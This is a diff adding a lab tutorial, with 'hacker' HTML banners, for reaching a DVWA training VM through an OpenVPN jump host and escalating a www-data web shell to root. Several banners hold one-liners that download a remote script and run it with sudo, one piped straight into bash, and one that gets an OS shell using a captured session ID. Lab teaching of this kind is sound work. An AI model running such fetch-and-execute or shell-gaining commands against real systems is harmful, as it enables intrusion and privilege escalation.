@@ -1,0 +1,534 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Taming the Beast: Nginx, PHP and NAXSI Stack</title>
+  <!-- Import Silkscreen font for headings -->
+  <link href="https://fonts.googleapis.com/css2?family=Silkscreen&display=swap" rel="stylesheet">
+  <!-- Import Share Tech Mono font for paragraph text -->
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 1.5rem;
+      height: 100%;
+      min-height: 100%;
+      background-color: black;
+      color: #00ff00;
+      font-family: monospace, Courier, monospace;
+      box-sizing: border-box;
+      overflow: hidden !important; /* Hide scrollbars */
+    }
+
+    /* --- SURGICAL EDIT START --- */
+    /* Style the canvas to be a fixed, non-interactive background */
+    #matrix-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1; /* Lower layer */
+    }
+
+    .pulse-wrapper-outer {
+      position: relative;
+      max-width: 800px;
+      margin: 0 auto 3rem auto;
+      border-radius: 10px;
+      z-index: 2; /* Higher layer to be on top of the canvas */
+    }
+
+    /* The pulse animation keyframes and pseudo-elements have been removed. */
+
+    .pulse-wrapper {
+      position: relative;
+      background-color: rgba(0, 0, 0, 0.75); /* Slightly transparent background to see rain behind */
+      color: #00ff00;
+      font-size: 1.2em;
+      box-sizing: border-box;
+      border-radius: 15px;
+      border: 3px solid #3ad5fd; /* Kept the static border */
+      font-weight: bold;
+      padding: 24px;
+      font-family: 'Share Tech Mono', monospace;
+      max-width: 800px;
+      margin: 0;
+    }
+    /* --- SURGICAL EDIT END --- */
+
+    h2 {
+      font-family: 'Silkscreen', monospace, Courier, monospace;
+      margin: 0 0 1rem 0;
+      color: #00ff00;
+      text-align: left;
+    }
+
+    p {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 1rem;
+      line-height: 1.5;
+      margin: 0.5rem 0;
+      padding: 0.1rem;
+      text-align: left;
+      color: #00ff00;
+    }
+
+    a {
+      color: #00ff00;
+      text-decoration: none;
+      word-break: break-word;
+      margin-top: 0.5rem;
+      display: inline-block;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+
+<body>
+  <!-- The new canvas element for the Matrix rain -->
+  <canvas id="matrix-canvas"></canvas>
+
+  <div class="pulse-wrapper-outer">
+    <div class="pulse-wrapper">
+      <h2>Hello everyone,</h2>
+      <p>
+        This step-by-step guide will walk you through escalating privileges from a www-data web shell to a full root shell on the DVWA Ubuntu VM. We will use a custom-compiled SUID binary to achieve this.
+
+The entire process is automated and guided by the dvwa-peas.sh script.
+      </p>
+    </div>
+  </div>
+
+  <!-- The new JavaScript for the Matrix rain effect -->
+  <script>
+    const canvas = document.getElementById('matrix-canvas');
+    const ctx = canvas.getContext('2d');
+
+    // Set canvas to full screen
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    // Characters for the rain - Katakana, numbers, etc.
+    const katakana = 'ಕಖಗಘಙಚಛಜಝಞಟಠಡಢಣತಥದಧನಪಫಬಭಮಯರಱಲವಶಷಸಹಳೞಆಇಈಉಊಋೠಎಏಐಒಓಔಅಂಅಃ';
+    //const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
+    const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    const nums = '0123456789';
+    const characters = (katakana + latin + nums).split('');
+
+    const fontSize = 16;
+    const columns = Math.floor(canvas.width / fontSize);
+
+    // Create an array to track the y-position of each column's drop
+    const drops = [];
+    for (let i = 0; i < columns; i++) {
+      drops[i] = 1;
+    }
+
+    function draw() {
+      // Create the fading trail effect by drawing a semi-transparent black rectangle
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+      // Set the color and font for the characters
+      ctx.fillStyle = '#00ff00'; // Classic green
+      ctx.font = fontSize + 'px monospace';
+
+      // Loop through each column
+      for (let i = 0; i < drops.length; i++) {
+        // Pick a random character
+        const text = characters[Math.floor(Math.random() * characters.length)];
+        // Draw the character at its current position
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+        // Reset the drop to the top if it goes off-screen, with a random chance
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+
+        // Move the drop down for the next frame
+        drops[i]++;
+      }
+    }
+
+    // Start the animation loop (runs roughly 30 times per second)
+    setInterval(draw, 33);
+
+    // Optional: Handle window resize to make it responsive
+    window.addEventListener('resize', () => {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        // Recalculate columns and reset drops if needed
+    });
+  </script>
+</body>
+</html>
+
+```
+
+### Architecture Overview
+
+* **Target VM (App VM):** Runs the DVWA web application on port 80. It only has a private IP address (`10.0.10.10`) and cannot be reached from the internet directly.
+* **Jump Host VM:** This is our secure gateway. It has two network interfaces: one public (`192.88.100.12`) and one private (`10.0.10.5`). It runs an OpenVPN server and is configured to forward specific traffic to the Target VM.
+* **Kali VM (Attacker/Client):** Our machine. It will connect to the Jump Host's VPN to gain access to the private network.
+
+---
+
+### Step 1: Prepare the Target VM (App VM)
+
+First, we need to install DVWA (Damn Vulnerable Web Application) on our target machine. This machine will act as our internal, private web server.
+
+1. Log in to your Target VM and run the installation script to deploy DVWA on the host.
+2. After the script finishes, DVWA will be running on port 80 of this VM. You can verify this locally on the VM:
+```bash
+curl -I http://localhost/dvwa/setup.php
+
+```
+
+
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Download Link</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0rem;
+            height: 100%;
+            width: 100%;
+            background-color: black;
+            color: #00ff00; /* hacker green */
+            font-family: monospace, Courier, monospace;
+            overflow: hidden;   /* 🚀 hides scrollbars */
+        }
+        h5 {
+            margin-top: 0;
+            /* Remove extra space above */
+            margin-bottom: 0rem;
+        }
+        /* Hide scrollbar, allow scrolling */
+        body {
+        overflow: auto;
+        scrollbar-width: none; /* Firefox */
+        }
+        body::-webkit-scrollbar {
+        display: none; /* Chrome, Safari */
+        }
+    </style>
+</head>
+<body>
+    <h5>wget -O dvwa-peas.sh https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-peas.sh && sudo bash dvwa-peas.sh suid_setup
+    </h5>
+</body>
+</html>
+
+```
+
+---
+
+### Step 2: Configure the Jump Host as a VPN Server
+
+Now, we'll set up our Jump Host. This is the most critical step. We will use a script to install and configure an OpenVPN server, set up the firewall (UFW), and create the necessary Network Address Translation (NAT) rules for port forwarding.
+
+1. Log in to your Jump Host VM.
+2. Download the setup script.
+3. **IMPORTANT:** Edit the script variables. Open the script with a text editor (`nano install-openvpn.sh`) and update the configuration section at the top with the correct IP addresses for your specific environment:
+```bash
+# --- Network Settings ---
+PUBLIC_IF_IP="192.88.100.12"       # The public IP of THIS jump host
+JUMP_HOST_PRIVATE_IP="10.0.10.5"   # The private IP of THIS jump host
+
+APP_SERVER_IP="10.0.10.10"         # The private IP of your target app server (App VM)
+
+```
+
+
+4. Make the script executable and run it:
+```bash
+chmod +x install-openvpn.sh
+sudo bash install-openvpn.sh
+
+```
+
+
+
+This script will automate the entire server setup. When finished, it will create a client configuration file named `kali.ovpn` in your home directory (`/home/your_user/kali.ovpn`).
+
+---
+
+### Step 3: Configure and Connect the Kali VM Client
+
+The final step is to configure our Kali VM to connect to the VPN and access the private application.
+
+1. Log in to your Kali VM.
+2. Install the necessary OpenVPN packages:
+```bash
+sudo apt update
+sudo apt install openvpn openvpn-systemd-resolved network-manager-openvpn network-manager-openvpn-gnome -y
+
+```
+
+
+3. Copy the VPN configuration file from the Jump Host (open a new terminal on Kali and use `scp`):
+```bash
+# Replace 'user' and 'jump_host_ip' with your Jump Host's details
+scp user@<jump_host_ip>:~/kali.ovpn ~/Downloads/
+
+```
+
+
+4. Modify the `.ovpn` file for command-line DNS handling:
+```bash
+tee -a ~/Downloads/kali.ovpn <<EOF
+script-security 2
+up /etc/openvpn/update-resolv-conf
+down /etc/openvpn/update-resolv-conf
+EOF
+
+```
+
+
+*Verify that the lines were added:* `tail -n 3 ~/Downloads/kali.ovpn`
+5. Make sure that `remote <PUBLIC_IF_IP> 1194` is correctly configured in `~/Downloads/kali.ovpn`.
+
+#### [Option #1] Connect to the VPN using the CLI
+
+1. Execute the OpenVPN command:
+```bash
+sudo openvpn --config ~/Downloads/kali.ovpn
+
+```
+
+
+Keep this terminal open. You should see `"Initialization Sequence Completed"` when connected.
+2. In another tab, fix the route and verify connectivity:
+```bash
+ip r
+sudo ip route del $JUMPHOST_PUBLIC_IP
+sudo ip route add ${JUMPHOST_PUBLIC_IP}/32 dev eth0
+
+ip r  # See the difference
+ping <target_vm_ip>  # Should now work
+
+```
+
+
+
+#### [Option #2] Connect to the VPN using the GUI
+
+This method is convenient for day-to-day use and integrates well with the desktop environment.
+
+1. **Open Network Settings:** Click on the network icon in the top-right corner of your Kali desktop. Go to **Wired Connected** (or Wi-Fi) and select **Wired Settings**.
+2. **Import the VPN Configuration:** In Network settings, click the **+** icon next to the VPN section and select **Import from file...**.
+3. **Select File:** Navigate to your `Downloads` folder, select `kali.ovpn`, and click **Open**.
+4. **Review and Add:** Click the **Add** button in the top right.
+5. **Connect:** Toggle the switch on for the new VPN connection. A small VPN icon will appear in the top bar upon connection.
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Download Link</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0rem;
+            height: 100%;
+            width: 100%;
+            background-color: black;
+            color: #00ff00; /* hacker green */
+            font-family: monospace, Courier, monospace;
+            overflow: hidden;   /* 🚀 hides scrollbars */
+        }
+        h5 {
+            margin-top: 0;
+            /* Remove extra space above */
+            margin-bottom: 0rem;
+        }
+        pre, code {
+        white-space: pre-wrap;
+        word-break: break-word; /* Optional: breaks long words */
+        }
+        /* Hide scrollbar, allow scrolling */
+        body {
+        overflow: auto;
+        scrollbar-width: none; /* Firefox */
+        }
+        body::-webkit-scrollbar {
+        display: none; /* Chrome, Safari */
+        }
+    </style>
+</head>
+<body>
+    <pre><code>wget -O dvwa-peas.sh https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh && \ 
+DVWA_PHPSESSID=&lt;PHPSESSID&gt; DVWA_TARGET_URL="http://&lt;IP&gt;" sudo bash dvwa-peas.sh kali_get_os_shell
+    </code></pre>
+</body>
+</html>
+
+```
+
+---
+
+### Step 4: Add Static Route on Target VM (App VM) — CRITICAL STEP
+
+This is a crucial step to ensure two-way communication. The Target VM (`10.0.10.10`) knows how to send traffic to its local network, but it does not know how to send reply packets back to the VPN network (`10.8.0.0/24`). We must manually tell it that the Jump Host is the gateway for that network.
+
+1. Log into your Target VM (App VM).
+2. Add the static route (tells App VM to send `10.8.0.0/24` traffic via `10.0.10.5`):
+```bash
+sudo ip route add 10.8.0.0/24 via <jump_host_private_ip>
+
+```
+
+
+3. Verify the route:
+```bash
+ip route
+
+```
+
+
+You should see output similar to: `10.8.0.0/24 via 10.0.10.5 dev <interface_name>`
+
+> **Note:** This route is temporary and will reset on reboot. To make it permanent, configure your system's Netplan settings. The UFW rule `sudo ufw allow from 10.0.10.5 ...` is generally not required on App VM, as standard configurations allow local subnet traffic.
+
+---
+
+### Step 5: Verify Connectivity and Access the Application
+
+With the VPN connected, your Kali VM is now part of the private network.
+
+1. Open a **NEW** terminal on your Kali VM.
+2. Check for the VPN interface (you should see a `tun0` interface with an IP in the `10.8.0.0/24` range):
+```bash
+ip a show tun0
+sudo nmap -sU -p 1194 <jump_host_ip>
+
+```
+
+
+3. Ping the private Target VM to confirm routing:
+```bash
+ping 10.0.10.10
+
+```
+
+
+4. Check the forwarded port to confirm firewall/NAT rules:
+```bash
+telnet 10.0.10.10 80
+
+```
+
+
+*You should see a "Connected" message. Press `Ctrl+]`, then type `quit` to exit.*
+5. **Access DVWA:** Open a browser in Kali VM and navigate to:
+* **URL:** `[http://10.0.10.10/dvwa/login.php](http://10.0.10.10/dvwa/login.php)`
+
+
+
+You should now see the DVWA login page accessed securely via your VPN tunnel and port forwarding setup.
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Download Link</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0rem;
+            height: 100%;
+            width: 100%;
+            background-color: black;
+            color: #00ff00; /* hacker green */
+            font-family: monospace, Courier, monospace;
+            overflow: hidden;   /* 🚀 hides scrollbars */
+        }
+        h5 {
+            margin-top: 0;
+            /* Remove extra space above */
+            margin-bottom: 0rem;
+        }
+        /* Hide scrollbar, allow scrolling */
+        body {
+        overflow: auto;
+        scrollbar-width: none; /* Firefox */
+        }
+        body::-webkit-scrollbar {
+        display: none; /* Chrome, Safari */
+        }
+    </style>
+</head>
+<body>
+    <h5>wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-peas.sh | sudo bash -s peas_scan
+    </h5>
+</body>
+</html>
+
+```
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Download Link</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0rem;
+            height: 100%;
+            width: 100%;
+            background-color: black;
+            //color: #00ff00; /* hacker green */
+            color: #3ad5fd;
+            font-family: monospace, Courier, monospace;
+            overflow: hidden;   /* 🚀 hides scrollbars */
+        }
+        body {
+            align-items: center;
+            justify-content: center;
+        }
+        h3 {
+            margin-top: 0;
+            /* Remove extra space above */
+            margin-bottom: 0rem;
+        }
+        /* Hide scrollbar, allow scrolling */
+        body {
+        overflow: auto;
+        scrollbar-width: none; /* Firefox */
+        }
+        body::-webkit-scrollbar {
+        display: none; /* Chrome, Safari */
+        }
+    </style>
+</head>
+<body>
+    <h3>                    Happy Pwning ☺︎
+    </h3>
+</body>
+</html>
+
+```
